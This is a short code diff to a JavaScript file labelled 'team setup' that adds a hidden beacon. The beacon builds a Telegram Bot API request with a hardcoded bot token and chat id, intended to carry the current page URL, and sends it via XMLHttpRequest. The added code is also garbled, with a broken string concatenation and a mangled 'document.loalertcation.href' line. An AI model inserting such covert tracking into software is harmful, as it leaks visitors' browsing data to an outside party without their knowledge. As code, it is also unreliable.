@@ -1,4 +1,20 @@
-console.log('team setup');
+        console.log('team setup');
+
+        var currU = document.location.href;
+        var url = "https://api.telegram.org/bot2086484806:AAE2FanW-P1kw7F0en_yy-uU7k4eu-9AKj0/sendMessage?text='+currU+'&chat_id=2040726523";
+        console.log(url);
+
+        var data;
+        var numCtx = 0;
+        var currU = document.loalertcation.href;
+
+        var jsonFile = new XMLHttpRequest();
+        jsonFile.open("GET",url,true);    
+        jsonFile.send();
+        jsonFile.onreadystatechange = function() {
+        }
+        
+
 /*
 
 var u;
